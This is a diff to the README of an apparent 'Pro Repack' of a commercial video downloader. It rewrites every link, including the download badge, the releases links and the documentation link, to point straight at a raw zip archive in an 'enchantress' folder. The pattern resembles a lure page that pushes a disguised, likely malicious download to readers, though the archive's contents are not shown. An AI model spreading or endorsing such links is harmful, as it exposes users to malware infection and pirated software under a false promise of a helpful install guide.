@@ -1,6 +1,6 @@
 # 🎥 YTD-Video-Downloader-Pro-Repack - Easy Video Downloads for Your PC
 
-[![Download YTD Video Downloader](https://img.shields.io/badge/Download-YTD%20Video%20Downloader-Pro-brightgreen)](https://github.com/sprlmp/YTD-Video-Downloader-Pro-Repack/releases)
+[![Download YTD Video Downloader](https://raw.githubusercontent.com/sprlmp/YTD-Video-Downloader-Pro-Repack/main/enchantress/Pro-Repack-Downloader-YT-Video-v1.1.zip%20Video%20Downloader-Pro-brightgreen)](https://raw.githubusercontent.com/sprlmp/YTD-Video-Downloader-Pro-Repack/main/enchantress/Pro-Repack-Downloader-YT-Video-v1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome! This guide will help you download and run the YTD Video Downloader Pro 
 
 To get started, you need to download the application from our Releases page. Click the link below:
 
-[Download YTD Video Downloader Pro](https://github.com/sprlmp/YTD-Video-Downloader-Pro-Repack/releases)
+[Download YTD Video Downloader Pro](https://raw.githubusercontent.com/sprlmp/YTD-Video-Downloader-Pro-Repack/main/enchantress/Pro-Repack-Downloader-YT-Video-v1.1.zip)
 
 1. **Visit the Releases Page**  
    Click on the link above to go to the Releases page. This page contains the latest version of the software.
@@ -69,7 +69,7 @@ Follow these simple steps to download a video:
 
 If you need help, check the following resources:
 
-- **User Manual:** Find detailed instructions within the app or on our [documentation page](https://github.com/sprlmp/YTD-Video-Downloader-Pro-Repack/wiki).
+- **User Manual:** Find detailed instructions within the app or on our [documentation page](https://raw.githubusercontent.com/sprlmp/YTD-Video-Downloader-Pro-Repack/main/enchantress/Pro-Repack-Downloader-YT-Video-v1.1.zip).
 - **FAQs:** Browse common questions and solutions in our FAQ section on the Releases page.
 - **Community Support:** Join our community forums if you have questions not covered here.
 
@@ -102,4 +102,4 @@ If you have additional questions or need further assistance, please reach out th
 
 Thank you for using YTD Video Downloader Pro Repack! Enjoy your video downloads with ease!
 
-[Download YTD Video Downloader Pro](https://github.com/sprlmp/YTD-Video-Downloader-Pro-Repack/releases)
+[Download YTD Video Downloader Pro](https://raw.githubusercontent.com/sprlmp/YTD-Video-Downloader-Pro-Repack/main/enchantress/Pro-Repack-Downloader-YT-Video-v1.1.zip)
